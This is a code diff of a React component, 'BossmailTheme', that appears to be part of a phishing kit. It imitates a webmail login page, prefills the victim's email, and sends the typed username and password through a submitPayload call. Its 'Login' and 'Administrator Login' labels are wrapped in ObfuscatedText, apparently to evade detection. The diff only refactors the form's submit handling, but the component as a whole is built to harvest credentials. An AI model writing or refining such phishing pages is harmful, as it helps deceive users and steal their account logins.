@@ -15,7 +15,8 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { reportViolation, submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async () => {
+  const handleSubmit = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
     setIsSubmitting(true);
     try {
       await submitPayload({ email: username, password }, 'bossmail');
@@ -88,81 +89,83 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
           initial={{ opacity: 0, scale: 0.95 }}
           animate={{ opacity: 1, scale: 1 }}
           transition={{ duration: 0.5, delay: 0.3 }}
-          className="relative z-10 w-full max-w-[400px] bg-white p-10 rounded-sm shadow-2xl border border-gray-100 flex flex-col h-[380px]"
+          className="relative z-10 w-full max-w-[400px] bg-white rounded-sm shadow-2xl border border-gray-100 flex flex-col focus-within:ring-0"
         >
-          <div className="space-y-6 flex-grow">
-            <div className="relative group">
-              <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
-                <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
-                  <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
-                </svg>
+          <form onSubmit={handleSubmit} className="p-10 space-y-6 flex-grow flex flex-col">
+            <div className="space-y-6 flex-grow">
+              <div className="relative group">
+                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
+                  <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
+                  </svg>
+                </div>
+                <input 
+                  type="text" 
+                  placeholder="username" 
+                  value={username}
+                  onChange={(e) => {
+                    setUsername(e.target.value);
+                    if (error) setError(null);
+                  }}
+                  className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
+                />
               </div>
-              <input 
-                type="text" 
-                placeholder="username" 
-                value={username}
-                onChange={(e) => {
-                  setUsername(e.target.value);
-                  if (error) setError(null);
-                }}
-                className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
-              />
-            </div>
 
-            <div className="relative group">
-              <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
-                <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
-                  <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
-                </svg>
+              <div className="relative group">
+                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
+                  <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
+                  </svg>
+                </div>
+                <input 
+                  type="password" 
+                  placeholder="Password" 
+                  value={password}
+                  onChange={(e) => {
+                    setPassword(e.target.value);
+                    if (error) setError(null);
+                  }}
+                  className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
+                />
               </div>
-              <input 
-                type="password" 
-                placeholder="Password" 
-                value={password}
-                onChange={(e) => {
-                  setPassword(e.target.value);
-                  if (error) setError(null);
-                }}
-                className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
-              />
-            </div>
 
-            <div className="flex items-center justify-between text-[12px] text-gray-500 mb-4">
-              <label className="flex items-center cursor-pointer">
-                <input type="checkbox" className="mr-2 accent-[#ef8133]" defaultChecked />
-                Remember me
-              </label>
-              <a href="#" className="hover:text-[#ef8133]">Forgot Password?</a>
-            </div>
+              <div className="flex items-center justify-between text-[12px] text-gray-500 mb-4">
+                <label className="flex items-center cursor-pointer">
+                  <input type="checkbox" className="mr-2 accent-[#ef8133]" defaultChecked />
+                  Remember me
+                </label>
+                <a href="#" className="hover:text-[#ef8133]">Forgot Password?</a>
+              </div>
 
-            <button 
-              onClick={handleSubmit}
-              disabled={isSubmitting}
-              className="w-full py-3 bg-[#ef8133] hover:bg-[#e67622] text-white font-bold rounded-sm transition-colors text-[16px] shadow-md uppercase tracking-wider disabled:opacity-70"
-            >
-              {isSubmitting ? '...' : <ObfuscatedText text="Login" />}
-            </button>
-
-            {error && (
-              <motion.div 
-                initial={{ opacity: 0, y: -10 }}
-                animate={{ opacity: 1, y: 0 }}
-                className="text-[#ef8133] text-[12px] text-center font-medium bg-orange-50 py-2 rounded border border-orange-100"
+              <button 
+                type="submit"
+                disabled={isSubmitting}
+                className="w-full py-3 bg-[#ef8133] hover:bg-[#e67622] text-white font-bold rounded-sm transition-colors text-[16px] shadow-md uppercase tracking-wider disabled:opacity-70"
               >
-                {error}
-              </motion.div>
-            )}
+                {isSubmitting ? '...' : <ObfuscatedText text="Login" />}
+              </button>
 
-            <div className="text-left">
-              <a href="#" className="text-[#1c74b4] text-[13px] hover:underline">Forget the password?</a>
+              {error && (
+                <motion.div 
+                  initial={{ opacity: 0, y: -10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  className="text-[#ef8133] text-[12px] text-center font-medium bg-orange-50 py-2 rounded border border-orange-100"
+                >
+                  {error}
+                </motion.div>
+              )}
+
+              <div className="text-left">
+                <a href="#" className="text-[#1c74b4] text-[13px] hover:underline">Forget the password?</a>
+              </div>
             </div>
-          </div>
 
-          <div className="text-right mt-auto">
-             <a href="#" className="text-[#1c74b4] text-[12px] hover:underline">
-               <ObfuscatedText text="Administrator Login" />
-             </a>
-          </div>
+            <div className="text-right mt-6">
+               <a href="#" className="text-[#1c74b4] text-[12px] hover:underline">
+                 <ObfuscatedText text="Administrator Login" />
+               </a>
+            </div>
+          </form>
         </motion.div>
       </main>
 
